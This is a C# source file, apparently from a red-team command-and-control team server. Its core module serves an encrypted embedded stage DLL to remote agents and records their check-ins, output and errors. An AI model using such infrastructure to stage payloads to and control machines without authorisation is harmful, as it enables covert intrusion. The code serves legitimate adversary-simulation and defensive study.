using Shared.Models;
using Shared.Utilities;

using System;
using System.Collections.Generic;
using System.Text;

using TeamServer.Controllers;
using TeamServer.Interfaces;
using TeamServer.Models;

namespace TeamServer.ServerModules
{
    public class CoreServerModule : IServerModule
    {
        ServerController Server;
        AgentController Agent;

        event EventHandler<AgentEvent> OnAgentEvent;

        public void Init(ServerController Server, AgentController Agent)
        {
            this.Server = Server;
            this.Agent = Agent;

            OnAgentEvent += Agent.AgentController_OnAgentEvent;
        }

        public ServerModule GetModuleInfo()
        {
            return new ServerModule
            {
                Name = "Core",
                Commands = new List<ServerModule.Command>
                {
                    new ServerModule.Command
                    {
                        Name = "StageRequest",
                        Delegate = HandleStageRequest
                    },
                    new ServerModule.Command
                    {
                        Name = "InitialCheckin",
                        Delegate = HandleInitialCheckin
                    },
                    new ServerModule.Command
                    {
                        Name = "AgentOutput",
                        Delegate = HandleAgentOutput
                    },
                    new ServerModule.Command
                    {
                        Name = "AgentError",
                        Delegate = HandleAgentError
                    }
                }
            };
        }

        void HandleStageRequest(string AgentID, C2Data C2Data)
        {
            var stage = Helpers.GetEmbeddedResource("stage.dll");

            var c2Data = Agent.Crypto.Encrypt(new C2Data
            {
                Module = "Core",
                Command = "StageResponse",
                Data = stage
            },
            out byte[] iv);

            Agent.SendAgentMessage(new AgentMessage
            {
                AgentID = AgentID,
                Data = c2Data,
                IV = iv
            });
        }

        void HandleInitialCheckin(string AgentID, C2Data C2Data)
        {
            var metadata = Utilities.DeserialiseData<AgentMetadata>(C2Data.Data);
            metadata.LastSeen = DateTime.UtcNow;
            Agent.AddNewAgent(metadata);
        }

        void HandleAgentOutput(string AgentID, C2Data C2Data)
        {
            Agent.AddNewEvent(
                new AgentEvent(AgentID,
                AgentEvent.EventType.AgentOutput,
                Encoding.UTF8.GetString(C2Data.Data))
                );
        }

        void HandleAgentError(string AgentID, C2Data C2Data)
        {
            Agent.AddNewEvent(
                new AgentEvent(AgentID,
                AgentEvent.EventType.AgentError,
                Encoding.UTF8.GetString(C2Data.Data))
                );
        }
    }
}